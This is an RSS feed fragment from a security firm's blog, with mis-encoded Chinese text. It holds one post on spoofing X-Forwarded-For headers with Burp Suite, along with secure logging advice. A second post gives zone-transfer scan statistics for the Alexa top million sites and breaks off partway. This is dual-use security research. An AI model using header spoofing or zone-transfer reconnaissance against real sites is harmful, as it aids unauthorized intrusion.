&lt;p&gt;ã€ŒX-Forwarded-Forã€é€™å€‹è®Šæ•¸é›–ç„¶ã€Œæœ‰æ©Ÿæœƒã€å–å¾—ä½¿ç”¨è€…çš„çœŸå¯¦ IPï¼Œä½†æ˜¯ç”±æ–¼é€™å€‹å€¼æ˜¯å¾å®¢æˆ¶ç«¯å‚³é€éä¾†çš„ï¼Œæ‰€ä»¥ã€Œæœ‰å¯èƒ½ã€è¢«ä½¿ç”¨è€…ç«„æ”¹ã€‚&lt;/p&gt;

&lt;p&gt;èˆ‰ä¾‹ä¾†èªªï¼Œæˆ‘å¯«äº†ä¸€å€‹å°ç¨‹å¼ï¼Œåµæ¸¬é€™äº›å¸¸è¦‹çš„ HTTP Header åˆ¤æ–· IPã€‚ä¸¦ä¸”ä½¿ç”¨ &lt;a href=&quot;http://portswigger.net/burp/&quot;&gt;Burp Suite&lt;/a&gt; é€™å€‹å·¥å…·ä¾†ä¿®æ”¹ HTTP Requestã€‚&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140619/2014-06-12-client-ip-detection-01-detech-user-ip.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140619/2014-06-12-client-ip-detection-01-detech-user-ip.png&quot; alt=&quot;é¡¯ç¤ºç›®å‰ IP ä»¥åŠç›¸é—œ header&quot; title=&quot;é¡¯ç¤ºç›®å‰ IP ä»¥åŠç›¸é—œ header&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;é é¢ä¸Šé¡¯ç¤ºç›®å‰æˆ‘ç›®å‰çš„ IPã€Œ49.50.68.17ã€ï¼Œä¸¦ä¸”å…¶ä»–çš„ header æ˜¯ç©ºçš„ã€‚ä½†å¦‚æœæˆ‘ä»Šå¤©ä½¿ç”¨ Burp Suite ä¹‹é¡çš„ Proxy å·¥å…·è‡ªè¡Œç«„æ”¹å°åŒ…ï¼ŒåŠ ä¸Š X-Forwarded-For æˆ–æ˜¯ Client-IP headerï¼š&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140619/2014-06-12-client-ip-detection-02-burp-suite-add-http-header.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140619/2014-06-12-client-ip-detection-02-burp-suite-add-http-header.png&quot; alt=&quot;ä½¿ç”¨ Burp Suite ä¿®æ”¹ HTTP Request Header&quot; title=&quot;ä½¿ç”¨ Burp Suite ä¿®æ”¹ HTTP Request Header&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;ä¿®æ”¹å®Œç•¢ä¹‹å¾Œï¼Œå†åˆ°åŸæœ¬çš„é¡¯ç¤º IP ä»‹é¢ï¼Œæœƒç™¼ç¾ç¶²é éŒ¯å°‡æˆ‘ç«„æ”¹çš„ header ç•¶ä½œæ­£ç¢ºçš„è³‡æ–™å¡«å…¥ã€‚&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140619/2014-06-12-client-ip-detection-03-detech-user-ip.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140619/2014-06-12-client-ip-detection-03-detech-user-ip.png&quot; alt=&quot;é¡¯ç¤ºé­åˆ°ç«„æ”¹çš„ HTTP Header&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;h3 id=&quot;ä½¿ç”¨ä»£ç†ä¼ºæœå™¨-proxy-çš„æƒ…æ³&quot;&gt;ä½¿ç”¨ä»£ç†ä¼ºæœå™¨ Proxy çš„æƒ…æ³&lt;/h3&gt;

&lt;p&gt;ä½¿ç”¨ä»£ç†ä¼ºæœå™¨çš„æƒ…æ³ä¸‹ï¼ŒHTTP Header æœƒæœ‰ä¸åŒçš„è¡Œç‚ºã€‚ä¾‹å¦‚ Elite Proxy å¦‚ä½•éš±è—å®¢æˆ¶ç«¯çš„çœŸå¯¦ IPã€‚ä»¥ä¸‹ç°¡å–®ä»‹ç´¹å¹¾ç¨®å¸¸è¦‹çš„ç‹€æ³çµ¦å„ä½åƒè€ƒã€‚&lt;/p&gt;

&lt;h4 id=&quot;ç›´æ¥é€£ç·š-æ²’æœ‰ä½¿ç”¨-proxy&quot;&gt;ç›´æ¥é€£ç·š ï¼ˆæ²’æœ‰ä½¿ç”¨ Proxyï¼‰&lt;/h4&gt;

&lt;ul&gt;
  &lt;li&gt;REMOTE_ADDR: å®¢æˆ¶ç«¯çœŸå¯¦ IP&lt;/li&gt;
  &lt;li&gt;HTTP_VIA: ç„¡&lt;/li&gt;
  &lt;li&gt;HTTP_X_FORWARDED_FOR: ç„¡&lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id=&quot;transparent-proxy&quot;&gt;Transparent Proxy&lt;/h4&gt;

&lt;ul&gt;
  &lt;li&gt;REMOTE_ADDR: æœ€å¾Œä¸€å€‹ä»£ç†ä¼ºæœå™¨ IP&lt;/li&gt;
  &lt;li&gt;HTTP_VIA: ä»£ç†ä¼ºæœå™¨ IP&lt;/li&gt;
  &lt;li&gt;HTTP_X_FORWARDED_FOR: å®¢æˆ¶ç«¯çœŸå¯¦ IPï¼Œå¾Œä»¥é€—é»ä¸²æ¥å¤šå€‹ç¶“éçš„ä»£ç†ä¼ºæœå™¨ IP&lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id=&quot;anonymous-proxy&quot;&gt;Anonymous Proxy&lt;/h4&gt;

&lt;ul&gt;
  &lt;li&gt;REMOTE_ADDR: æœ€å¾Œä¸€å€‹ä»£ç†ä¼ºæœå™¨ IP&lt;/li&gt;
  &lt;li&gt;HTTP_VIA: ä»£ç†ä¼ºæœå™¨ IP&lt;/li&gt;
  &lt;li&gt;HTTP_X_FORWARDED_FOR: ä»£ç†ä¼ºæœå™¨ IPï¼Œå¾Œä»¥é€—é»ä¸²æ¥å¤šå€‹ç¶“éçš„ä»£ç†ä¼ºæœå™¨ IP&lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id=&quot;high-anonymity-proxy-elite-proxy&quot;&gt;High Anonymity Proxy (Elite Proxy)&lt;/h4&gt;

&lt;ul&gt;
  &lt;li&gt;REMOTE_ADDR: ä»£ç†ä¼ºæœå™¨ IP&lt;/li&gt;
  &lt;li&gt;HTTP_VIA: ç„¡&lt;/li&gt;
  &lt;li&gt;HTTP_X_FORWARDED_FOR: ç„¡ (æˆ–ä»¥é€—é»ä¸²æ¥å¤šå€‹ç¶“éçš„ä»£ç†ä¼ºæœå™¨ IP)&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;å¯¦éš›æƒ…æ³&quot;&gt;å¯¦éš›æƒ…æ³&lt;/h3&gt;

&lt;p&gt;åœ¨æˆ‘å€‘æ¸¬è©¦çš„éç¨‹ä¸­ï¼Œé€šå¸¸æˆ‘å€‘éƒ½æœƒè®“ç€è¦½å™¨è‡ªå¸¶ X-Forwarded-Forï¼Œä¸¦ä¸”è‡ªè¡Œå¡«å…¥ IPã€‚å¸¸å¸¸æœƒç™¼ç¾æœ‰ä¸€äº›ç¶²ç«™å‡ºç¾å¦‚ä¸‹çš„è­¦å‘Šâ€¦&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140619/2014-06-12-client-ip-detection-04-discuz-user-ip.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140619/2014-06-12-client-ip-detection-04-discuz-user-ip.png&quot; alt=&quot;Discuz! é¡¯ç¤º IP éŒ¯èª¤&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;æœ‰æ²’æœ‰æéŒ¯ï¼Ÿã€Œä¸Šæ¬¡ç™»å…¥ä½ç½® 127.0.0.1ã€ï¼Ÿæ²’éŒ¯ï¼Œé€™å€‹æ˜¯çŸ¥åè«–å£‡å¥—ä»¶ã€Œ&lt;a href=&quot;http://www.discuz.net/&quot;&gt;Discuz!&lt;/a&gt;ã€çš„åŠŸèƒ½ï¼ŒæŠ“å– IP çš„åŠŸèƒ½ä¹Ÿæ˜¯ä¸å®‰å…¨çš„å¯«æ³•ã€‚ä¹Ÿæœ‰é€™æ¨£çš„ç¶“é©—ï¼Œä¹‹å‰é–‹è‘— X-Forwarded-For çš„ header åˆ°ä¸€äº›ç¶²ç«™ï¼Œç«Ÿç„¶ç›´æ¥å‡ºç¾ç®¡ç†è€…å¾Œå°ï¼&lt;/p&gt;

&lt;p&gt;ä½ è¦ºå¾—åªæœ‰ä¸€èˆ¬äººæ’°å¯«çš„ç¨‹å¼æœƒæœ‰é€™æ¨£çš„å•é¡Œå—ï¼Ÿå…¶å¯¦å¤§å‹ç¶²ç«™ä¹Ÿå¯èƒ½æœƒæœ‰é¡ä¼¼çš„å•é¡Œã€‚é€™æ¨£çš„å¯«æ³•å¯èƒ½æœƒè®“ç®¡ç†è€…æ°¸é æŠ“ä¸åˆ°çŠ¯ç½ªè€…çš„çœŸå¯¦ IPï¼Œç”šè‡³æ”»æ“Šè€…å¯ä»¥ç«„æ”¹ header æ’å…¥ç‰¹æ®Šå­—å…ƒï¼Œå°ç¶²ç«™é€²è¡Œ SQL Injection æˆ–è€… Cross-Site Scripting æ”»æ“Šã€‚&lt;/p&gt;

&lt;h3 id=&quot;æ­£ç¢ºåˆå®‰å…¨çš„æ–¹å¼&quot;&gt;æ­£ç¢ºåˆå®‰å…¨çš„æ–¹å¼&lt;/h3&gt;

&lt;p&gt;ã€Œ&lt;strong&gt;ä»»ä½•å¾å®¢æˆ¶ç«¯å–å¾—çš„è³‡æ–™éƒ½æ˜¯ä¸å¯ä¿¡ä»»çš„ï¼&lt;/strong&gt;ã€&lt;/p&gt;

&lt;p&gt;è«‹å„ä½é–‹ç™¼è€…ã€ç®¡ç†è€…è¨˜ä½é€™å€‹å¤§åŸå‰‡ï¼Œé›–ç„¶é€™äº› Request Header å¯èƒ½å«æœ‰çœŸå¯¦ IP çš„è³‡è¨Šï¼Œä½†æ˜¯å› ç‚ºä»–çš„å®‰å…¨æ€§ä¸é«˜ï¼Œå› æ­¤æˆ‘å€‘çµ•å°ä¸èƒ½å®Œå…¨ä¿¡è³´é€™å€‹æ•¸å€¼ã€‚&lt;/p&gt;

&lt;p&gt;é‚£æˆ‘å€‘è©²æ€éº¼è™•ç†å‘¢ï¼Ÿæˆ‘çš„å»ºè­°æ˜¯è¨˜éŒ„æ‰€æœ‰ç›¸é—œçš„ header æ¬„ä½å­˜å…¥è³‡æ–™åº«ï¼ŒåŒ…å«ã€ŒREMOTE_ADDRã€ã€ŒX-Forwarded-Forã€ç­‰ç­‰ï¼ŒçœŸæ­£æœ‰çŠ¯ç½ªäº‹ä»¶ç™¼ç”Ÿæ™‚ï¼Œå°±å¯ä»¥èª¿å‡ºæ‰€æœ‰å®Œæ•´çš„ IP è³‡è¨Šé€²è¡Œäººå·¥åˆ¤æ–·ï¼Œæ‰¾å‡ºçœŸæ­£çš„ IPã€‚ç•¶ç„¶å¾ header å­˜å…¥çš„æ•¸å€¼ä¹Ÿå¯èƒ½æœƒé­åˆ°æ”»æ“Šè€…ç«„æ”¹æ’å…¥ç‰¹æ®Šå­—å…ƒå˜—è©¦ SQL Injectionï¼Œå› æ­¤å­˜å…¥å€¼å¿…é ˆå…ˆç¶“ééæ¿¾ï¼Œæˆ–è€…ä½¿ç”¨ Prepared Statement é€²è¡Œå­˜æ”¾ã€‚&lt;/p&gt;

&lt;p&gt;å¯ä»¥åƒè€ƒçš„ HTTP Headerï¼ˆä¾ç…§å¯èƒ½å­˜æ”¾çœŸå¯¦ IP çš„é †åºï¼‰&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;HTTP_CLIENT_IP&lt;/li&gt;
  &lt;li&gt;HTTP_X_FORWARDED_FOR&lt;/li&gt;
  &lt;li&gt;HTTP_X_FORWARDED&lt;/li&gt;
  &lt;li&gt;HTTP_X_CLUSTER_CLIENT_IP&lt;/li&gt;
  &lt;li&gt;HTTP_FORWARDED_FOR&lt;/li&gt;
  &lt;li&gt;HTTP_FORWARDED&lt;/li&gt;
  &lt;li&gt;REMOTE_ADDR (çœŸå¯¦ IP æˆ–æ˜¯ Proxy IP)&lt;/li&gt;
  &lt;li&gt;HTTP_VIA (åƒè€ƒç¶“éçš„ Proxy)&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;ã€Œé§­å®¢æ€ç¶­ã€å°±æ˜¯æ‰¾å‡ºç¶²ç«™ä»»ä½•å¯èƒ½ç«„æ”¹çš„å¼±é»ï¼Œå¾ç¶²é ä¸Šçš„å…ƒç´ åˆ° HTTP Header éƒ½æ˜¯å˜—è©¦çš„å°è±¡ã€‚å› æ­¤èº«ç‚ºé˜²ç¦¦è€…ä¸€å®šè¦æ¸…æ¥šçš„çŸ¥é“å“ªäº›æ•¸å€¼æ˜¯ä¸èƒ½ä¿¡è³´çš„ï¼Œä¸è¦å†åƒè€ƒç¶²è·¯ä¸ŠéŒ¯èª¤çš„æ•™å­¸äº†ï¼&lt;/p&gt;
</description>
                <link>https://devco.re/blog/2014/06/19/client-ip-detection/</link>
                <guid>https://devco.re/blog/2014/06/19/client-ip-detection</guid>
                <pubDate>Thu, 19 Jun 2014 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>Zone Transfer Statistics of Alexa Top 1 Million</title>
                <description>&lt;h3 id=&quot;zone-transfer-ä¸–ç•Œå¤§æ­ç§˜&quot;&gt;Zone Transfer ä¸–ç•Œå¤§æ­ç§˜&lt;/h3&gt;

&lt;p&gt;é‚„è¨˜å¾—åœ¨ä¸Šä¸€ç¯‡æ–‡ç«  &lt;a href=&quot;https://devco.re/blog/2014/05/05/zone-transfer-CVE-1999-0532-an-old-dns-security-issue/&quot;&gt;Zone Transfer CVE-1999-0532 - å¤è€çš„ DNS è³‡å®‰è­°é¡Œ&lt;/a&gt;ä¸­æˆ‘å€‘æ›¾æåˆ°ï¼Œè‹¥å°å…¨ä¸–ç•Œçš„ç¶²ç«™é€²è¡Œ zone transfer æª¢æ¸¬ææ€•æœƒæœ‰æ›´å¤šé©šäººçš„æ¡ˆä¾‹å—ï¼Ÿæ­£å¥½ &lt;a href=&quot;http://s3.amazonaws.com/alexa-static/top-1m.csv.zip&quot;&gt;Alexa æä¾›äº†å…¨çƒæ’åå‰ä¸€ç™¾è¬åçš„ç¶²ç«™è³‡æ–™&lt;/a&gt;ï¼Œæˆ‘å€‘å°±ä»¥é€™ä»½è³‡æ–™ç‚ºåŸºç¤ä¾†åšä¸€äº›çµ±è¨ˆå§ï¼&lt;/p&gt;

&lt;h3 id=&quot;æœ‰å•é¡Œçš„-domain-ç¸½æ•¸èˆ‡æ¯”ä¾‹&quot;&gt;æœ‰å•é¡Œçš„ domain ç¸½æ•¸èˆ‡æ¯”ä¾‹&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;79133ï¼Œç´„ä½”æ‰€æœ‰å—æ¸¬ç›®æ¨™çš„ 8.014%&lt;/li&gt;
  &lt;li&gt;ä¸Šè¿° domain çš„æ‰€æœ‰ zone file å…±å«æœ‰ 22631804 ç­† DNS è¨˜éŒ„&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;ç”±æ–¼åœ¨ Alexa Top 1M ä¸­æœ‰è¨±å¤šè³‡æ–™æ˜¯é‡è¤‡çš„ domainï¼Œå¦å¤–ä¹Ÿæœ‰äº›è³‡æ–™æ˜¯ IPï¼Œåœ¨æœ¬æ¬¡çš„æª¢æ¸¬ç•¶ä¸­éƒ½ä¸åˆ—å…¥è¨ˆç®—ï¼Œå› æ­¤å—æ¸¬ domain ç¸½æ•¸åƒ…æœ‰ 987447 å€‹ï¼Œè€Œéä¸€ç™¾è¬å€‹ã€‚å¦å¤–ï¼Œæœ¬æ¬¡æƒæç‚ºæ±‚å¿«é€ŸçŠ§ç‰²äº†éƒ¨åˆ†æº–ç¢ºç‡ï¼Œå› æ­¤å¯¦éš›æ•¸é‡æ‡‰æ¯” 79133 æ›´å¤šã€‚&lt;/p&gt;

&lt;!-- more --&gt;

&lt;h3 id=&quot;æœ‰å•é¡Œçš„-top-level-domain-tld-æ•¸é‡&quot;&gt;æœ‰å•é¡Œçš„ Top-Level Domain (TLD) æ•¸é‡&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;å…¨ä¸–ç•Œ TLD ç¸½æ•¸ï¼š567&lt;/li&gt;
  &lt;li&gt;å—æ¸¬ç›®æ¨™çš„ TLD ç¸½æ•¸ï¼š316ï¼Œä½”å…¨ä¸–ç•Œç¸½æ•¸çš„ 55.73%&lt;/li&gt;
  &lt;li&gt;æœ‰ zone transfer å•é¡Œçš„ TLD ç¸½æ•¸ï¼š220ï¼Œä½”å—æ¸¬ç›®æ¨™çš„ 69.62%&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;ç›®å‰ TLD ç¸½æ•¸çš„æ•¸æ“šå–è‡ªæ–¼ &lt;a href=&quot;https://data.iana.org/TLD/tlds-alpha-by-domain.txt&quot;&gt;Internet Assigned Numbers Authority (IANA)&lt;/a&gt;ï¼Œä¸äº†è§£ TLD æ˜¯ä»€éº¼çš„äººå¯ä»¥åƒè€ƒ&lt;a href=&quot;http://en.wikipedia.org/wiki/Top-level_domain&quot;&gt;é€™ç¯‡ç¶­åŸºç™¾ç§‘æ–‡ç« &lt;/a&gt;ã€‚&lt;/p&gt;

&lt;p&gt;æœ‰è¶£çš„æ˜¯ï¼Œé€£ä¸€äº›æ–°çš„ TLD éƒ½æœ‰ zone transfer å•é¡Œï¼Œä¾‹å¦‚ .technologyã€.museum ç­‰ç­‰ï¼Œå¯è¦‹é€™çœŸçš„å¾ˆå®¹æ˜“è¢«å¤§å®¶å¿½ç•¥ï½&lt;/p&gt;

&lt;h3 id=&quot;é—œæ–¼å„å€‹-tld-çš„çµ±è¨ˆæ•¸æ“š&quot;&gt;é—œæ–¼å„å€‹ TLD çš„çµ±è¨ˆæ•¸æ“š&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;Transferable domain in this TLDï¼šåœ¨ç‰¹å®š TLD ä¸­ï¼Œæœ‰å¤šå°‘ domain å¯ä»»æ„åŸ·è¡Œ zone transfer&lt;/li&gt;
  &lt;li&gt;Same TLD in Alexa top 1Mï¼šç‰¹å®š TLD åœ¨æœ¬æ¬¡ 987447 å€‹å—æ¸¬ç›®æ¨™ä¸­æ‰€ä½”çš„æ•¸é‡&lt;/li&gt;
  &lt;li&gt;Percentage of same TLD in Alexa top 1Mï¼šç‰¹å®š TLD åœ¨ Alexa top 1M å…§æ‰€æœ‰åŒæ¨£ TLD æ‰€ä½”çš„ç™¾åˆ†æ¯”ï¼ˆä¾‹ï¼š.com å³ç‚º 35230 / 527203 = 6.68%ï¼‰&lt;/li&gt;
  &lt;li&gt;Percentage of all transferable domainï¼šæŸç‰¹å®š TLD å¯ä»»æ„åŸ·è¡Œ zone transfer çš„æ•¸é‡åœ¨æœ¬æ¬¡æ‰€æœ‰å¯ä»»æ„åŸ·è¡Œ zone transfer æ‰€å çš„ç™¾åˆ†æ¯”ï¼ˆä¾‹ï¼š.com å³ç‚º 35230 / 79133 = 44.52%ï¼‰&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;ç”±æ–¼åŸå§‹æ•¸æ“šå¤ªå¤šï¼Œå› æ­¤æœ¬æ–‡åƒ…åˆ—å‡ºå‰ 25 åã€‚&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140613/zone-transfer-statistics-of-TLD.png&quot; title=&quot;Zone Transfer å•é¡Œçš„ TLD ç›¸é—œçµ±è¨ˆ&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140613/zone-transfer-statistics-of-TLD.png&quot; alt=&quot;Zone Transfer å•é¡Œçš„ TLD ç›¸é—œçµ±è¨ˆ&quot; title=&quot;Zone Transfer å•é¡Œçš„ TLD ç›¸é—œçµ±è¨ˆ&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;.tw ç¶²åŸŸæ’ç¬¬äºŒåä¸€åï¼Œå¹¸å¥½é€™æ¬¡ä¸æ˜¯ä¸–ç•Œç¬¬ä¸€äº†ï¼Œå¦å‰‡åˆæ˜¯å¦é¡çš„å°ç£ä¹‹å…‰ã€‚&lt;/p&gt;

&lt;h3 id=&quot;é—œæ–¼-name-server-çš„çµ±è¨ˆæ•¸æ“š&quot;&gt;é—œæ–¼ name server çš„çµ±è¨ˆæ•¸æ“š&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;Number of domainï¼šè©²å° name server æœ‰å¤šå°‘ domain å¯ä»»æ„åŸ·è¡Œ zone transfer&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;ç”±æ–¼åŸå§‹æ•¸æ“šå¤ªå¤šï¼Œå› æ­¤æœ¬æ–‡åƒ…åˆ—å‡ºå‰ 25 åã€‚&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140613/zone-transfer-statistics-of-name-server.png&quot; title=&quot;Zone Transfer å•é¡Œçš„ name server ç›¸é—œçµ±è¨ˆ&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140613/zone-transfer-statistics-of-name-server.png&quot; alt=&quot;Zone Transfer å•é¡Œçš„ name server ç›¸é—œçµ±è¨ˆ&quot; title=&quot;Zone Transfer å•é¡Œçš„ name server ç›¸é—œçµ±è¨ˆ&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;å¯åŸ·è¡Œ zone transfer ä¸”ä¸é‡è¤‡çš„ namer server å…±æœ‰ 53830 å€‹&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h3 id=&quot;é—œæ–¼-ip-ä½å€çš„çµ±è¨ˆæ•¸æ“š&quot;&gt;é—œæ–¼ IP ä½å€çš„çµ±è¨ˆæ•¸æ“š&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;æœ‰ 7939172 å€‹ä¸é‡è¤‡çš„ IP ä½å€&lt;/li&gt;
  &lt;li&gt;åœ¨å…¨éƒ¨ IP ä½å€ä¸­ï¼Œæœ‰ 704638 å€‹æ˜¯ç§æœ‰ IP ä½å€&lt;/li&gt;
  &lt;li&gt;åœ¨ç§æœ‰ IP ä½å€ä¸­ï¼Œæœ‰ 598443 å€‹æ˜¯ 10. é–‹é ­ï¼Œä½”æ‰€æœ‰ IP ä½å€çš„ 7.538%ï¼Œä½”ç§æœ‰ IP ä½å€çš„ 84.929%&lt;/li&gt;
  &lt;li&gt;åœ¨ç§æœ‰ IP ä½å€ä¸­ï¼Œæœ‰ 66270 å€‹æ˜¯ 172.16~31 é–‹é ­ï¼Œä½”æ‰€æœ‰ IP ä½å€çš„ 0.835%ï¼Œä½”ç§æœ‰ IP ä½å€çš„ 9.405%&lt;/li&gt;
  &lt;li&gt;åœ¨ç§æœ‰ IP ä½å€ä¸­ï¼Œæœ‰ 39925 å€‹æ˜¯ 192.168 é–‹é ­ï¼Œä½”æ‰€æœ‰ IP ä½å€çš„ 0.503%ï¼Œä½”ç§æœ‰ IP ä½å€çš„ 5.666%&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;subdomain-çš„çµ±è¨ˆæ•¸æ“š&quot;&gt;subdomain çš„çµ±è¨ˆæ•¸æ“š&lt;/h3&gt;

&lt;p&gt;ä»¥ä¸‹é¸å‡ºä¸€äº›å¸¸è¢«å…¥ä¾µè€…ç•¶ä½œæ”»æ“Šç›®æ¨™çš„ subdomain ä¾†è¨ˆç®—åœ¨ 22631804 ç­† DNS è¨˜éŒ„ä¸­åˆ†åˆ¥å„ä½”äº†å¹¾ç­†ï¼Œæ¯å€‹ subdomain å…±æœ‰å…©å€‹çµ±è¨ˆçµæœï¼Œé€—è™Ÿå·¦é‚Šçš„çµ±è¨ˆçµæœä»£è¡¨ä»¥è©² subdomain é–‹é ­çš„ DNS è¨˜éŒ„ï¼Œä¾‹å¦‚ git.devco.reã€‚é€—è™Ÿå³é‚Šçš„çµ±è¨ˆçµæœå‰‡å°‡å‰å¾Œæœ‰æ•¸å­—çš„ subdomain ä¹Ÿä¸€ä½µè¨ˆå…¥ï¼Œä¾‹å¦‚ dns01.devco.reã€01dns.devco.reã€0dns001.devco.re ç­‰ç­‰ã€‚&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;ç‰ˆæœ¬æ§åˆ¶&lt;/p&gt;

    &lt;p&gt;git: 583, 626&lt;/p&gt;

    &lt;p&gt;gitlab: 138, 138&lt;/p&gt;

    &lt;p&gt;svn: 1552, 1669&lt;/p&gt;

    &lt;p&gt;subversion: 71, 72&lt;/p&gt;

    &lt;p&gt;cvs: 284, 330&lt;/p&gt;

    &lt;p&gt;hg: 115, 331&lt;/p&gt;

    &lt;p&gt;mercurial: 18, 19&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;é–‹ç™¼èˆ‡æ¸¬è©¦&lt;/p&gt;

    &lt;p&gt;test: 14691, 20001&lt;/p&gt;

    &lt;p&gt;dev: 8300, 10959&lt;/p&gt;

    &lt;p&gt;stage: 1329, 1628&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;è³‡æ–™åº«&lt;/p&gt;

    &lt;p&gt;db: 1190, 2537&lt;/p&gt;

    &lt;p&gt;database: 150, 302&lt;/p&gt;

    &lt;p&gt;sql: 2209, 3298&lt;/p&gt;

    &lt;p&gt;mysql: 4045, 4998&lt;/p&gt;

    &lt;p&gt;postgre: 11, 11&lt;/p&gt;

    &lt;p&gt;redis: 21, 33&lt;/p&gt;

    &lt;p&gt;mongodb: 6, 42&lt;/p&gt;

    &lt;p&gt;memcache: 13, 72&lt;/p&gt;

    &lt;p&gt;phpmyadmin: 455, 485&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;å¾Œå°ç®¡ç†&lt;/p&gt;

    &lt;p&gt;manager: 188, 222&lt;/p&gt;

    &lt;p&gt;staff: 481, 542&lt;/p&gt;

    &lt;p&gt;member: 331, 376&lt;/p&gt;

    &lt;p&gt;backend: 153, 177&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;ç·šä¸Šæœå‹™ç›¸é—œ&lt;/p&gt;

    &lt;p&gt;api: 1871, 2097&lt;/p&gt;

    &lt;p&gt;search: 1469, 10987&lt;/p&gt;

    &lt;p&gt;pic: 178, 293&lt;/p&gt;

    &lt;p&gt;img: 1775, 3517&lt;/p&gt;

    &lt;p&gt;service: 779, 959&lt;/p&gt;

    &lt;p&gt;payment: 225, 238&lt;/p&gt;

    &lt;p&gt;cache: 373, 627&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;ç§æœ‰æœå‹™&lt;/p&gt;

    &lt;p&gt;erp: 275, 318&lt;/p&gt;

    &lt;p&gt;eip: 69, 80&lt;/p&gt;

    &lt;p&gt;log: 227, 414&lt;/p&gt;

    &lt;p&gt;nagios: 636, 736&lt;/p&gt;

    &lt;p&gt;mrtg: 458, 565&lt;/p&gt;

    &lt;p&gt;cgi: 194, 261&lt;/p&gt;

    &lt;p&gt;dns: 2634, 9085&lt;/p&gt;

    &lt;p&gt;ns: 12198, 63431&lt;/p&gt;

    &lt;p&gt;ftp: 197414, 199481&lt;/p&gt;

    &lt;p&gt;blog: 5074, 5446&lt;/p&gt;

    &lt;p&gt;mail: 238742, 254515&lt;/p&gt;

    &lt;p&gt;email: 2484, 2706&lt;/p&gt;

    &lt;p&gt;webmail: 24164, 25067&lt;/p&gt;

    &lt;p&gt;owa: 798, 888&lt;/p&gt;

    &lt;p&gt;autodiscover: 30462, 30466&lt;/p&gt;

    &lt;p&gt;vpn: 3152, 7025&lt;/p&gt;

    &lt;p&gt;sso: 398, 462&lt;/p&gt;

    &lt;p&gt;ssl: 709, 932&lt;/p&gt;

    &lt;p&gt;proxy: 1464, 2215&lt;/p&gt;

    &lt;p&gt;cms: 1320, 1696&lt;/p&gt;

    &lt;p&gt;crm: 1152, 1301&lt;/p&gt;

    &lt;p&gt;forum: 3654, 4037&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;æŒ‰-end-çš„äººæœ‰ç¦äº†&quot;&gt;æŒ‰ End çš„äººæœ‰ç¦äº†&lt;/h3&gt;

&lt;p&gt;ç©¶ç«Ÿç¶“ç”± zone transfer æ‰€å¾—åˆ°çš„è³‡æ–™å¯ä»¥æ‹¿ä¾†åšä»€éº¼ï¼Ÿå°æ–¼æ”»æ“Šè€…è€Œè¨€ï¼Œä¸»è¦æœ‰ä»¥ä¸‹ä¸‰ç¨®åˆ©ç”¨æ–¹å¼ï¼š&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;å»ºç«‹å­—å…¸æª”ï¼šå…¥ä¾µè€…å¯åˆ©ç”¨ä¸Šè¿°è³‡æ–™å»ºç«‹ä¸€ä»½æœ€å¸¸è¦‹çš„ subdomain çš„å­—å…¸æª”ï¼Œæœªä¾†åˆ©ç”¨æ­¤å­—å…¸æª”é€²è¡Œæƒææ™‚å¯ç¯€çœè¨±å¤šæ™‚é–“æˆæœ¬ï¼Œå¿«é€Ÿæª¢æ¸¬æŸé–“å…¬å¸æœ‰å“ªäº› subdomain&lt;/li&gt;
